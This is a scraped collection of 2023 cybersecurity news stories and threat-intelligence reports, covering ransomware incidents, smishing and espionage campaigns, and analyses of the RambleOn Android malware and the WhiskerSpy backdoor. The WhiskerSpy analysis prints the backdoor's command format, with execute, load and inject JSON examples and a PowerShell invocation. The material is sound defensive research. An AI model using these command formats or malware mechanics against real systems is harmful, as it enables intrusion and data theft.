changing passwords, enabling two-factor authentication, and staying vigilant for signs of phishing attacks. Only by working together and taking these steps can we hope to mitigate the risks posed by hackers impersonating ChatGPT and other forms of cybercrime in the future.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " Commercial radio stations across Russia on Wednesday morning broadcast warnings about air raids and missile strikes. The Ministry of Emergency Situations said the broadcasts were the “result of a hacker attack.”A statement from the Ministry of Emergency Situations said: “This morning in some regions, listeners on the air of radio stations could hear an alarm signal and a text message asking them to go to the shelter.”The ministry said that as a result of the breach affecting the unnamed satellite, “an unauthorized tie-in is going on the air,” and stressed that the alarm signals “do not correspond to reality.” The statement did not mention Ukraine.Authorities in Russian districts had to issue public statements to deny the threat of a missile strike. The governments of the Belgorod and Voronezh regions said that they presumed that the attack was conducted “from the Ukrainian side.”The authorities in Voronezh described the incident as “a provocation of accomplices of the Kyiv regime and is not true. The situation in the region is under control and without incident.”Oleg Shakirov, a foreign policy researcher based in Moscow, has posted several videos to Twitter of the broadcast alert as initially shared by Telegram users.It is not known who is to blame for the incident. The Russian government has repeatedly attempted to emphasize the danger that the Russian state and people face as a result of what it calls the special operation in Ukraine.Last month several Pantsir-S1 mobile anti-aircraft systems were installed on the roofs of buildings in central Moscow, almost 1,000 km north of the frontlines in eastern Ukraine. Although there have been reports that Ukrainian forces have conducted operations against the Russian military inside of Russian territory, Ukraine does not possess weapons capable of striking Moscow.Alexander Martin is the UK Editor for Recorded Future News.

      "text": " Maia Sandu, the pro-European president of Moldova who last week warned of an active Russian plot to overthrow her country’s government, told the Munich Security Conference on Saturday that she needed a range of support from other European nations to defend the integrity of her state.President Sandu said Russia was “waging hybrid war against Moldova” including through “propaganda and disinformation” alongside “multiple cyberattacks” and “multiple false bomb alerts.” These actions are intended to undermine social cohesion, provoke protests and allow external saboteurs to launch a coup, she said.Speaking on a panel about “partnering up for European Security” — alongside NATO Secretary General Jens Stoltenberg, Finland’s President Sauli Niinisto, and Denmark’s Prime Minister Mette Frederiksen — Sandu described months of Russian aggressions against her country.“In the fall they tried to use the energy crisis, hoping that we’ll not be able to pay the very high prices for gas and electricity. When they saw that the government managed to find the money, Gazprom cut gas supply by 60% hoping that we will not find alternative sources, and that the paid protests would overthrow the legally elected government.”She further described these plans on Saturday by saying Russia “might try to bring people from outside the country to organize this violent protest and then to force the authorities into negotiations on snap parliamentary elections.”“All of this is meant to destabilize the society and to use the difficult economic situation that we face because of Russia’s war in Ukraine to bring people into the streets and then to change the government, and to bring a pro-Russian government that it could use also against Ukraine,” she said.Denmark’s Frederiksen praised the Moldovan leader: “Maia, you really are a brave European president. Moldova is a small, is a poor, and a fragile European country. You can be next in line, when we’re talking about Russia. And you’re standing up — you as a person — for democracy, rule of law, and anti-corruption.”President Sandu called on Frederiksen and his European peers to support Moldova in its time of crisis. “Because of the internal threats of the hybrid war, we need support to develop our strategic intelligence capabilities, to deal with cyberthreats, we need support to modernize our border security and control, we need support for special intervention focus capabilities.”“This is a very big issue… it’s probably now the most damaging element for our society and our democracy,” said Sandu.Alexander Martin is the UK Editor for Recorded Future News.

Public water supply and sanitation were not affected by the attack. The LockBit group added the company to its leak site on February 18, according to cybersecurity expert Dominic Alvieri. LockBit gave the utility until March 7 to pay a ransom, threatening to publish stolen information from Águas e Energia do Porto systems if the deadline passed without payment.The utility is owned by the city and is one of the largest Portuguese water supply and wastewater sanitation companies, serving approximately half a million people.The company was still able to process customer requests at in-person service desks, and it urged people to get virtual service tickets that could be obtained instead of standing in line. Águas e Energia do Porto said it contacted both the Portuguese National Cybersecurity Center and the Judiciary Police for assistance with the situation. The utility did not respond to requests for comment about an update on the situation. In addition to managing the water supply and wastewater, the company drains Porto's rainwater, controls about 85 kilometers of water lines, manages the city's waterfront, and more.Water utilities are also frequent targets for ransomware gangs because of the personal customer information, financial data and residence information the companies typically hold.

      "text": " Tech News and AnalysisA newly created artificial intelligence (AI) system based on deep reinforcement learning (DRL) can react to attackers in a simulated environment and block 95% of cyberattacks before they escalate.That's according to the researchers from the Department of Energy's Pacific Northwest National Laboratory (PNNL) who built an abstract simulation of the digital conflict between attackers and defenders in a network and trained four different DRL neural networks to maximize rewards based on preventing compromises and minimizing network disruption.The successful training of the AI system on the simplified attack environment demonstrates that defensive responses to attacks in real time could be handled by an AI model, says Samrat Chatterjee, a data scientist who presented the team's work at last week's annual meeting of the Association for the Advancement of Artificial Intelligence in Washington, DC.\"You don't want to move into more complex architectures if you cannot even show the promise of these techniques,\" he says. \"We wanted to first demonstrate that we can actually train a DRL successfully and show some good testing outcomes before moving forward.\"Yet creating an AI system capable of proactive defense continues to be an aspirational, rather than practical, goal. While a variety of hurdles remain for researchers, the PNNL research shows that an AI defender could be possible in the future.The goals of the attacker agents are to move through the seven steps of the attack chain, from initial access to execution, from persistence to command and control, and from collection to impact.For the attacker, adapting their tactics to the state of the environment and the defender's current actions can be complex, says PNNL's Chatterjee.\"The adversary has to navigate their way from an initial recon state all the way to some exfiltration or impact state,\" he says. \"We're not trying to create a kind of model to stop an adversary before they get inside the environment — we assume that the system is already compromised.\"The researchers used four approaches to neural networks based on reinforcement learning (RL), which is an ML approach that emulates the reward system of the human brain. A neural network learns by strengthening or weakening certain parameters for individual neurons to reward better solutions, as measured by a score indicating how well the system performs.RL essentially allows the computer to create a good, but not perfect, approach to the problem at hand, says Mahantesh Halappanavar, a PNNL researcher and an author of the paper.\"Without using any reinforcement learning, we could still do it, but it would be a really big problem that will not have enough time to actually come up with any good mechanism,\" he says. \"Our research ... gives us this mechanism where deep reinforcement learning is sort of mimicking some of the human behavior itself, to some extent, and it can explore this very vast space very efficiently.\"Among the many problems that remain to be solved is getting RL and deep neural networks to explain the factors that influenced their decisions — an area of research called explainable reinforcement learning (XRL).In addition, the robustness of the AI algorithms and finding efficient ways of training the neural networks are both problems that need to be solved, says PNNL's Chatterjee.\"Creating a product — that was not the main motivation for this research,\" he says. \"This was more about scientific experimentation and algorithmic discovery.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " One of the employees who was targeted responded to an attacker's SMS and gave up credentials to the corporate system; the person then received a follow-up phone call attempting to gain access after initial attempts to log in were blocked by MFA security. Coinbase's Computer Security Incident Response Team (CSIRT) responded within 10 minutes of the attack to shut it down, preventing a far more serious incident, the company said.The situation once again demonstrates how human error remains a key factor in the success of cyberattacks, and the risk that increasingly sophisticated social engineering campaigns pose to the enterprise, Jeff Lunglhofer, Coinbase's CISO, noted in the blog post.While \"situations like this are never easy to talk about,\" Coinbase revealed and detailed the attack in the interest of transparency, as well as to help other organizations understand the potential risks from smishing in order to protect themselves from similar incidents, he said.\"They are embarrassing for the employee, they are frustrating for cybersecurity professionals, and they are frustrating for management,\" Lunglhofer wrote. \"But as a community we need to be more open about issues like this.\"Coinbase is a cryptocurrency exchange with more than 1,200 employees worldwide and more than 108 million verified users, making it an attractive target for financially motivated threat actors, Lunglhofer said.The recent attack occurred on Sunday, Feb. 5, when the mobile phones of several Coinbase employees received SMS messages indicating that they needed \"to urgently log in\" to their Coinbase accounts via a link \"to receive an important message,\" according to the post.While most of the targeted employees ignored the message, one didn't, clicking on the link and eventually providing threat actors with their username and password. Attackers then proceeded to log in to the Coinbase system using the legitimate employee credentials, but couldn't provide the correct MFA credentials and thus was blocked from access.Twenty minutes after the initial SMS message, the phone of the compromised employee rang. On the line was the attacker, claiming to be from Coinbase corporate IT and in need of the employee's help. The employee once again believed the request was legitimate and followed attacker instructions, logging in to the Coinbase system and responding to what became increasingly suspicious requests from the attacker.The employee's actions gave up \"some limited contact information\" for Coinbase employees — including names, email addresses, and some phone numbers — but did not expose any customer info or other sensitive data, nor did the attackers gain the ability to steal Coinbase crypto, the company said.Eventually, Coinbase's CSIRT intervened and reached out to the smishing victim to ask about unusual behavior and usage patterns associated with their account, and the employee terminated communication with the attacker, he wrote. CSIRT then suspended the employee's account access and launched an investigation.In this case, the cleanup after the attack was \"relatively quick,\" Lunglhofer said. However, the incident provides useful takeaways as to why sophisticated, socially engineered phishing attacks are still so successful even though they've been occurring since the emergence of the mainstream Internet, and the fact that there's broad awareness of them.One important point to note is that even the savviest cyber-aware person can be fooled by a clever, socially engineered attack because of humans' natural tendency to want to \"get along\" and \"be part of the team,\" Lunglhofer noted. \"Under the right circumstances nearly anyone can be a victim,\" he wrote.Coinbase provided a list of the attackers' tactics, techniques, and procedures (TTPs) to help enterprises prevent attacks or recognize suspicious login attempts on the corporate system. In particular, login attempts to corporate applications from third-party VPN services should be flagged as suspicious, as they may be using stolen credentials, cookies, or other session tokens, Lunglhofer observed.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " Israel's top technology school, Technion Israel Institute of Technology (IIT), is the victim of a ransomware attack by the DarkBit hacker group, which has demanded an 80-Bitcoin payout (around $1.7 million at press time) in a ransom note laden with anti-Israel sentiments.\"That might suggest DarkBit maintained the initial access to the victim's network sometime before that, while the implant was compiled a few hours before the attack materialized,\" says Dmitry Bestuzhev, a threat researcher at BlackBerry.BlackBit also warned IIT that if the organization did not pay the ransom within 48 hours, the amount would jump 30%.The extent of the damage, the origin of the breach, and the initial infection vector have not been publicly released.The Golang-based ransomware possesses several notable features, such as the ability to accept command-line arguments and function independently. Its default mode involves encrypting the victim's device by utilizing AES-256, impacting numerous file types. Additionally, it employs the method of multithreading to ensure quicker and more effective encryption.Bestuzhev tells Dark Reading that based on the ransom note, and threat actor's Twitter account and Telegram profile, the main motivator for the attack is geopolitical rather than financial.An additional motivator — revenge — was indicated through a DarkBit tweet and the text of the ransom note, which alludes to the possibility that a vengeful former tech employee may be leveraging insider knowledge of tooling and software to carry out the attacks.\"A kindly advice to the hight-tech [sic] companies: From now on, be more careful when you decide to fire your employees, specially [sic] the geek ones. #DarkBit,\" the tweet stated.Bestuzhev says that targeting a university creates noise, and since geopolitics is the agenda, the goal is to spread the message.\"With many students and associates who can't study and work, it serves as a message amplifier,\" he says. \"From the attacker's perspective, it's a great target to reach as many people as possible.\"Melissa Bischoping, director of endpoint security research at Tanium, agrees this attack touches on multiple motivations — political hacktivism, revenge, and financial gain.\"Whoever is behind DarkBit has included comments in their ransom notes about their stances on political regimes as well as comments regarding layoffs and terminations of technical employees,\" she says. \"It remains to be seen if this is an entirely new group or an offshoot of a previous gang.\"\"Ransomware operators are not concerned with remaining undetected,\" Bischoping says. \"In fact, it's quite the opposite — they want to send a message, cause damage, and get paid.\"She explains that universities can be popular targets because they often have understaffed IT departments and many endpoints to manage and secure, leaving multiple openings for a compromise.\"It wasn't a random attack, as DarkBit's social media as well as their ransom note indicate clear political stances and motives against the Israeli government and its associated organizations,\" she adds.Darren Guccione, CEO and co-founder at Keeper Security, says it's inadvisable to assume a threat actor’s only motivations behind a ransomware attack, or any other type of malware offensive, are the ones that seem obvious or are spelled out by the threat actors themselves.\"While ransomware is typically used to get paid, it could also be nothing more than a smoke screen or bonus payday as the threat actors work to compromise a target’s system or IT infrastructure in other ways,\" he says.\"No matter the threat actor’s apparent or true motivations behind this attack, a full investigation must be done to evaluate the scope of the cyberattack and remediate the damage,\" Guccione says.As with all ransomware attacks, he advises against paying the ransom to deter future attacks of a similar nature.\"Organizations should also consider implementing a zero-trust, zero-knowledge architecture to mitigate the damage of any future cyberattack,\" Guccione says.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " A previously unknown threat actor is targeting telecommunications companies in the Middle East in what appears to be a cyber-espionage campaign similar to many that have hit telecom organizations in multiple countries in recent years.Researchers from SentinelOne who spotted the new campaign said they're tracking it as WIP26, a designation the company uses for activity it has not been able to attribute to any specific cyberattack group.\"The WIP26 activity is a relevant example of threat actors continuously innovating their TTPs [tactics, techniques and procedures] in an attempt to stay stealthy and circumvent defenses,\" the company said.The attacks that SentinelOne observed usually began with WhatsApp messages directed at specific individuals within target telecom companies in the Middle East. The messages contained a link to an archive file in Dropbox that purported to contain documents on poverty-related topics pertinent to the region. But in reality, it also included a malware loader. Users tricked into clicking on the link ended up having two backdoors installed on their devices. SentinelOne found one of them, tracked as CMD365, using a Microsoft 365 Mail client as its C2, and the second backdoor, dubbed CMDEmber, using a Google Firebase instance for the same purpose.The security vendor described WIP26 as using the backdoors to conduct reconnaissance, elevate privileges, deploy addition malware — and to steal the user's private browser data, information on high-value systems on the victim's network, and other data. SentinelOne assessed that a lot of the data that both backdoors have been collecting from victim systems and network suggest the attacker is prepping for a future attack. \"The initial intrusion vector we observed involved precision targeting,\" SentinelOne said. \"Further, the targeting of telecommunication providers in the Middle East suggests the motive behind this activity is espionage-related.\"More often though, cyberespionage and surveillance have been primary motivations for attacks on telecommunications providers. Security vendors have reported several campaigns where advanced persistent threat groups from countries like China, Turkey, and Iran have broken into a communication provider's network so they could spy on individuals and groups of interest to their respective governments.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " Author : Ovi Liber, Threat Researcher @ InterlabPublishing Date : 2022/12/30Freedom of media and journalism is essential to enable democratic, free, and participative societies. However, as cyberthreats with political motivation targeting journalists grows while nature of journalists’ work involves in receiving and opening random files and links in the name of receiving tips from unknown sources, the importance of digital safety for journalists are ever imminent.On December 7th, a journalist received a message over WeChat messenger application asking to talk privately about a sensitive topic. The both parties discuss messaging over a secure application and the sender suggests talking over an application called “Fizzle messenger” and proceeds to send a copy of the APK to lure a journalist to install. The application “Fizzle messenger” acts as a first stage of the malware, a loader, performing various checks on the Android device to serve a payload. The served payload that provides malicious methods that can be called from a C2, exfiltrates sensitive data to cloud storage and downloads a secondary payload. The secondary payload exfiltrates further data, registers services for continual exfiltration and provides C2 mechanisms via Google’s Firebase Cloud Messaging.This threat report contains a breakdown of the functionality of this malware and we have shared sample hashes at the end of the report. The malware has multiple stages, payloads and exfiltrates data from the Android device continually. Below, we describe in simple steps how the malware executes and compromises its victims.  Figure 1 Diagram of malware flowAs discussed in the introduction, the victim received a direct message over WeChat. The message relates to the sender discussing potential sensitive information and both parties discuss communicating over a more secure messaging app. The original sender, suggests to talk on an application called “Fizzle”, proceeding to send a copy of the file with the filename “1_Fizzle.apk” and suggests the victim to install the application. At the time of writing, the application was only determined as malicious by one vendor, however this only flagged for a PUA signature. Figure 1 VirusTotal scan results of Fizzle messaging appThe application itself works functionally as a messaging app, prompting the user to create an account link from another device..Figure 2 Screenshot of the Fizzle Application home pageUpon initial inspection of the application, we can first see that it has many permissions in its manifest that are dangerous in certain contexts. However, since this application is a messaging application, all of these permissions could be deemed as something necessary for its functionality. Many of these permissions can be seen in widely used legitimate messaging applications. Due to this, a user may not think this application is malicious.Figure 3 Fizzle messaging app permissionsWhen the application runs, the process itself spawns as “ch.seme”; during analysis, we identified one file that contained payload delivery functionality. Located at “ch.seme.services.LogUService”, the class contains dynamic Dex class loading via module “dalvik.system.DexClassLoader”. The malicious app uses the “DexClassLoader” to dynamically load a Dex file from a cloud storage endpoint (either pCloud or Yandex) and execute. The application loads the Dex, which has a process name “com.personal.info” and class name “plugin”.Figure 4 Screenshot of ch.seme.LogUService’s usage of DexClassLoaderThe “LogUService” class contains multiple methods that provide capability to download the first payload from one of two endpoints located at cloud storage services, pCloud and Yandex. These cloud storage services are called via OAuth API calls using hard coded access tokens within the application. Figure 5 Screenshot of the ch.seme.services.LogUService’s openConnection() usage to download the first stage payloadDepending on what configuration options are set in the “ch.seme.services.Constants.cloud” variable, the method determines which endpoint is used to serve the payload to the victim. If the variable is set to “P”, the class uses the pCloud endpoint, if not, it uses Yandex.Figure 6 Screenshot of the ch.seme.services.LogUService cloud storage if statementThe “LogUService” described is launched during application load through “onStart()” within the “HomeActivity” class. Figure 7 Screenshot of service launch within ch.seme.client.HomeActivityThe service is also checked for when the application is resumed by the user.Figure 8 Screenshot of the onResume() method within ch.seme.client.HomeActivityThis usage of “DexClassLoader” to dynamically load a Dex file “com.personal.info” from one of two cloud storage endpoints, provides the application functionality to execute first payload on the victim’s device. When the “LogUService” service is launched, the Dex file downloaded from either pCloud or Yandex, to the directory “/data/user/0/ch.seme/files/.temp/”. During our analysis, we were served the payload described below; for simplicity, we have categorised its functionality in the table shown. However, it should be noted that in our sample analysed, not all of this functionality was being used by the payload, as there are many methods that appear to be unutilised.The first payload’s primary functionality sits within the class located at “com.personal.info.plugin”. Figure 9 Class structure of first payloadThis “plugin” class, contains various methods that can be called by the C2 and data uploaded back to the cloud storage account:However, the primary function of the payload is to provide functions to be called by the C2 and for the initial loader to call “LogState”. When “LogState” is called by the loader, this calls “updateState”, which then runs a method named “UpdateCmd()”. This method, downloads the second payload, which we will cover in the next section, titled ‘Stage 3: The second payload & C2 client – com.data.WeCoin’.Figure 10 Screenshot of both LogState and UpdateState methods within the first payloadIt then calls the method “sendData”, which exfiltrates messaging data from the phone, encrypts the files and uploads back to the cloud storage C2s. Figure 11 Screenshot of sendData exfiltration function within first payloadTo command and control the first two stages of the malware, the operators of RambleOn use authentication tokens to both pCloud and Yandex cloud service providers. In the sample we analysed, the malware was using pCloud. When the loader application starts, the application registers the device for Pushy.me notifications using the Android SDK. Then proceeding to run the “LogUService”, which downloads the first payload from pCloud or Yandex. It then writes the Dex file to the following directory and filename: /data/user/0/ch.seme/files/.temp/plugin4.0.dex. The “LogUService” then uses the DexClassLoader to load the Dex file class “plugin” and execute method “LogState”.Figure 12 Screenshot of LogUService DexClassLoader utilisationThis method, contained within the first payload, proceeds to gather information about the device, exfiltrate all SMS, MMS, call logs, audio and media and then finally calls “sendToServer()” method to upload files back to the cloud storage service. Figure 13 Screenshot of sendToServer() method contained within first payloadTo receive commands to initiate payload delivery. The registration of the device to Pushy.me allows push message to be sent to the device, much like Firebase Cloud Messaging. Figure 14 Screenshot of the RegisterForPushNotificationsAsync method called on application startWe see that the “com.seme.services.PushReceiver” is set with intent filter designated for the  Pushy.me notifications, in addition to the “LogUService” class. Providing the class with file receiver functionality. Figure 15 Screenshot of Application Manifest file showing application file receiversIt is within the “PushReceiver” class, upon receiving a push message, the Default Shared Preferences XML file is modified with content relevant to the cloud storage C2 mechanism. It then proceeds to initialise the “LogUService” service, loading the payload and calling the method within the payload required by the operator. Figure 16 Screenshot of PushReceiver classAs shown in the relevant examples throughout this report, the running of the “LogUService” ensures the application will periodically reach out to the cloud provider to download the first payload. Figure 17 Screenshot of Burp Suite network proxy traffic from the applicationThis is also ensured by the “LogJobService” class being ran as a service by the application.Figure 18 Screenshot of Application Manifest showing service ch.seme.services.LogJobServiceThe class ensures the “LogUService” continually runs in order to keep consistent communication & data exfiltration back to the command-and-control cloud service. Figure 19 Screenshot of ch.seme.services.LogJobServiceAs explained in the previous section. The initial loader, in this case, the “Fizzle” application, calls “LogState” within the first payload Dex file. The “LogState” method calls “updateState”, which then calls a method named “UpdateCmd()”. The method, again reaches out to the cloud storage accounts via OAuth API and pulls a second payload down to the device using access tokens. This second payload, is an APK that gets installed to the device named “com.data.WeCoin”. Figure 20 Screenshot of first payload initiating the second payloadThis method, then proceeds to load the APK’s service which include additional C2 functionally back to the operator. This APK provides C2 functionality to interact with the first payload Dex file. In order for it to function correctly, the method checks that it can still access the Dex file. If it isn’t there, it will redownload the payload. Figure 21 updateCmd() function second payload service runs & payload checksFigure 22 Screenshot of the MyFirebaseMessagingService class implementationThe payload itself then registers many services contained within the APK which perform DexClassLoading operations to the secondary payload stored on the device. These services can then be run continuously via the C2. These include: Figure 23 Services contained in the second payloadBelow, provides an example of the “sendJobService” class which allows the C2 to trigger a data exfiltration event. Figure 24 Screenshot of sendJobService class contained in the second payloadOver the last year, Interlab has been working with human rights activists and journalists to document and index digital threats. Building a database of these threats, allow us to provide correlation between events based on categorised elements within each individual attack. To support this, we use the Diamond model to facilitate correlations for attribution. The diamond model relies upon indexing elements of an attack based on four categories: Adversary attributes (source email, handles, phone numbers, network assets etc), infrastructure (IP addresses, domain names, email addresses etc), victimology (modus operandi, targeted individual or organisational, personas, network assets, email addresses etc), capabilities (malware, exploits, hack tools, stolen certificates etc).During our analysis of RambleOn, we found very little data points within our dataset that support clear and direct attribution for this event. However, there are multiple aspects that should be noted that can enrich further attribution in the future: We believe that raising these points allows for a pragmatic approach to the potentiality of attribution by other researchers going forward.  Interlab is a non-profit organization based in Seoul with mission to create resilient digital safety net for freedom of citizens, providing free digital security consultations, trainings, incident response support and research of cyber threat toward civic society.For any inquiries regarding on this report, please reach us through contact@interlab.or.krInterlab, Nonprofit Association\n(Korean Identification Number : 603-82-75631)G407, 115, Wangsimni-ro, Seongdong-gu, Seoul, Republic of Koreacontact@interlab.or.kr"

Since 2019, Earth Kitsune has been distributing variants of self-developed backdoors to targets, primarily individuals who are interested in North Korea.By: Joseph C Chen, Jaromir Horejsi\n\t\t\n\t\t\tFebruary 17, 2023\nRead time:  ( words)\n\tSave to FolioAt the end of 2022, we discovered that the website of a pro-North Korean organization was compromised and modified to distribute malware. When a targeted visitor tries to watch videos on the website, a malicious script injected by the attacker displays a message prompt notifying the victims with a video codec error to entice them to download and install a trojanized codec installer. The installer was patched to load a previously unseen backdoor, that we dubbed “WhiskerSpy.” In addition, we also found the threat actor adopting an interesting persistence technique that abuses Google Chrome’s native messaging host.In this blog post, we are going to reveal the infection chain and technical details of the WhiskerSpy backdoor employed by Earth Kitsune.At the end of 2022, we noticed that a pro-North Korean website had a malicious script injected in their video pages. The script showed a popup window with a fake error message, designed to entice victims to install a malicious package disguised as an Advanced Video Codec - AVC1.The webpages were configured to deliver the malicious script only to visitors from a list of targeted IP addresses (visitors that did not have these IP addresses would not receive the malicious payload). This configuration makes the attack difficult to discover. Fortunately, we managed to find a text file on the threat actor’s server containing a regular expression matching the targeted IP addresses. These include:The IP addresses in Shenyang and Nagoya are likely to be their real targets. However, we found the targeted IP addresses in Brazil mostly belonged to a commercial VPN service. We believe that the threat actor used this VPN service to test the deployment of their watering hole attacks. It also provided us with an opportunity to verify the watering hole attack by using the same VPN service to successfully receive the malicious script.The website loads a malicious JavaScript (popup.js) with the following redirection code:The entry point of the patched installer is changed to immediately jump to the shellcode. The shellcode is encrypted with a simple key (XOR 0x01).After decryption, the shellcode runs several PowerShell commands to download additional stages of malware. These files are executable files with a few hundred bytes from the beginning XORed with   one-byte key.It then restores the original entry point (15 bytes in total) to ensure that the original installer runs as expected.This contains the path \\microsoft\\onedrive\\vcruntime140.dll, which is the location where another downloaded file (bg.jpg) gets dropped under the name vcruntime140.dll.This is a patched version of vcruntime140.dll (Microsoft C Runtime library). In this instance, the function memset was patched, as seen in Figures 10 and 11. The return from function (retn) was replaced with a jump to overlay (in the newly adde .odata section), where an injected code reads bytes from the overlay, XORs them with a 1-byte key and injects the embedded payload into the werfautl.exe process. The shellcode in the overlay is a loader of the main backdoor.This is an installer package that contains Installer.exe (a Google Chrome extension installer), NativeApp.exe (a native messaging host) and Chrome extension files (background.js, manifest.json, and icon.png).The format of the message is as follows: xx xx xx xx {“cmd”:””,”data”:””}, where xx xx xx xx is length of the message in bytes.  The “cmd” key must contain one of the implemented command values (execute, load, and inject), while the “data” key may contain additional parameters like path and the program to be executed.The following are examples of valid JSON messages:{\"cmd\":\"execute\",\"data\":[\"c:\\\\windows\\\\system32\\\\notepad.exe\"]}{\"cmd\":\"load\",\"data\":[\"c:\\\\temp\\\\hello-world-x64.dll\",\"MessageBoxThread\"]}{\"cmd\":\"inject\",\"data\":[\"\"]}powershell Get-Content .\\cmd.bin -raw | NativeApp.exeIn the current implementation, the inject command has no parameters. Instead, it connects to the hardcoded URL address http://<delivery server>/help[.]jpg, downloads, decodes and runs the main payload, which is a backdoor.This is a shellcode that loads another embedded executable —  the main backdoor payload which we named WhiskerSpy.WhiskerSpy uses elliptic-curve cryptography (ECC) to exchange encryption keys between the client and server. The following are the implemented backdoor commands:There is one more value shown in Figure 16 (brown color) which represents the hardcoded server’s public key.C&C communication begins by registering the machine ID (function number = 3; POST request with “l<machineID>*”).The uploading of the 64-byte file with the x-coordinate of the client public key and the encrypted AES key follows (function number = 1; POST request with “l<machineID><sessionID>”.WhiskerSpy then periodically requests the C&C server for any tasks it should perform (function number = 2; POST request with “h<machineID>*”.WhiskerSpy implements standard functions. While analyzing the code, we noticed a few status codes designed to report the state of the task, with the first words (two bytes) of the received message being the command ID. Note that, in the case of the command packet, the magic value is the same for all commands: it is found before the command ID and is not displayed in Table 2. In the case of  the alive packet, the first word (2 bytes) of the magic value is used as the command ID, therefore the 0x70D value can be found in the table.Older versions of WhiskerSpy are 32-bit executables and implement only subsets of the previously mentioned functions ( 1-5,8,0x70D are the same, 6 = exit process; 7 = drop file to temp and execute it). The remaining functions are missing.The communication is not via HTTP protocol, but via FTP protocol. This means that the FTP name and password must be hardcoded in the binary to enable communication. This approach leaks the current number of victims as l<machineID><sessionID> and h<machineID> files that are visible to anyone who knows the login credentials.The FTP version of the backdoor also checks for the presence of the debugger. If present, the status code „HELO>“ is sent to the C&C server.This threat is very interesting from a technical perspective. It patches the legitimate installers to hide its activities, uses lesser-known hashing algorithms to compute machine IDs and session IDs and employs ECC to protect encryption keys. In addition, the presented methods of persistence are also quite unique and rare. This shows that Earth Kitsune are proficient with their technical abilities and are continuously evolving their tools, tactics, and procedures TTPs.Joseph C ChenThreat ResearcherJaromir HorejsiThreat ResearcherTry our services free for 30 daysSelect a country / regionCopyright ©2023 Trend Micro Incorporated.

      "title": "HardBit ransomware wants insurance details to set the perfect price",
      "text": " A ransomware threat called HardBit has moved to version 2.0 and its operators are trying to negotiate a ransom payment that would be covered by the victim's insurance company.Specifically, the threat actor tries to convince the victim that it is in their interest to disclose all insurance details so they can adjust their demands so the insurer would cover all costs.Unlike most ransomware operations, HardBit does not feature a data leak site, although its operators claim to steal victim data and threaten to leak it unless a ransom is paid.As a ransomware strain, HardBit 2.0 features some capabilities to lower the victim's security, like modifying the Registry to disable Windows Defender's real-time behavioral monitoring, process scanning, and on-access file protections.The malware also targets 86 processes for termination, to make sensitive files available for encryption. It establish persistence by adding itself to the \"Startup\" folder, and deletes the Volume Shadow copies to make data recovery more difficult.An interesting element concerning the encryption phase is that instead of writing encrypted data to file copies and deleting the originals like many strains do, HardBit 2.0 opens the files and overwrites their content with encrypted data.This approach makes it harder for experts to recover the original files and makes the encryption slightly faster.Like other ransomware strains, the note that HardBit 2.0 drops on the victim's system does not inform of the amount the hackers want in exchange for the decryption key. Victims get 48 hours to contact the attacker over an open-source encrypted peer-to-peer communications messaging app.The threat actor advises the victims not to work with intermediaries, since this would only drive up the total cost, but to contact them directly for negotiations.For companies that have insurance for cyberattacks, the hackers have a more elaborate set of instructions and urge them to disclose the insurance amount for successful dialogue.Even more, the hackers make it look like sharing the insurance details is beneficial to the victim, painting the insurer as the bad guy that stands in the way of recovering their data.The threat actors say that insurers never negotiate with ransomware actors with their client's interests in mind, so they make ludicrous counter-offers to their demands just to derail the negotiations and refuse to pay.\"To avoid all this and get the money on the insurance, be sure to inform us anonymously about the availability and terms of the insurance coverage, it benefits both you and us, but it does not benefit the insurance company,\" HardBit operators say in a note to victims.The attackers say that if they know the exact insurance amount, they would know exactly how much to ask so the insurer is forced to cover the demand.Of course, victims are also typically contractually limited not to disclose insurance details to the attackers, and doing so risks losing any chance of the insurer covering the damages. This is why the hackers insist on these details to be shared privately.Regardless of their offer, ransomware operators' goal is to get paid and they would say anything to get the money. The reality is that they cannot be trusted.Refusing to pay the ransom and reporting the incident to law enforcement along with having a consistent backup strategy are the only ways to fight this type of threat and bring it to an end."

      "title": "New Stealc malware emerges with a wide set of stealing capabilities",
      "text": " A new information stealer called Stealc has emerged on the dark web gaining traction due to aggressive promotion of stealing capabilities and similarities with malware of the same kind like Vidar, Raccoon, Mars, and Redline.Security researchers at cyber threat intelligence company SEKOIA spotted the new strain in January and noticed it started to gain tractionin early February.Stealc has been advertised on hacking forums by a user called “Plymouth,” who presented the malware as a piece of malware with extensive data-stealing capabilities and an easy-to-use administration panel.According to the advertiser, apart from the typical targeting of web browser data, extensions, and cryptocurrency wallets, Stealc also has a customizable file grabber that can be set to target whatever file types the operator wishes to steal.After the initial post, Plymouth started to promote the malware on other hacking forums and on private Telegram channels, offering test samples to potential customers.The seller also set up a Telegram channel dedicated to publishing Stealc’s new version changelogs, the most recent being v1.3.0, released on February 11, 2023. The malware is actively developed, and a new version appears on the channel every week.Plymouth also said that Stealc was not developed from scratch but instead relied on Vidar, Raccoon, Mars and Redline stealers.One commonality the researchers found between Stealc and Vidar, Raccoon and Mars infostealers is that they all download legitimate third-party DLLs (e.g. sqlite3.dll, nss3.dll) to help with pilfering sensitive data.The researchers discovered more than 40 C2 servers for Stealc and several dozens of samples in the wild, indicating that the new malware has attracted the interest of the cybercriminal community. This popularity may be accounted by the fact that customers with access to the administration panel can generate new stealer samples, which increase the chances of the malware leaking to a broader audience.Despite the poor business model, SEKOIA believes that Stealc represents a significant threat as it could be adopted by less technical cybercriminals.Stealc has added new features since its first release in January, including a system to randomize C2 URLs, a better logs (stolen files) searching and sorting system, and an exclusion for victims in Ukraine.The features that SEKOIA could verify by analyzing the captured sample are the following:SEKOIA's curent report does not include all the data obtained from reverse engineering Stealc but provides an overview of the main steps of its execution.When deployed, the malware deobfuscates its strings and performs anti-analysis checks to ensure it doesn’t run in a virtual environment or sandbox.Next, it dynamically loads WinAPI functions and initiates communication with the C2 server, sending the victim’s hardware identifier and build name in the first message, and receiving a configuration in response.Stealc then collects data from the targeted browsers, extensions, and apps, and also executes its custom file grabber if active, and finally exfiltrates everything to the C2. 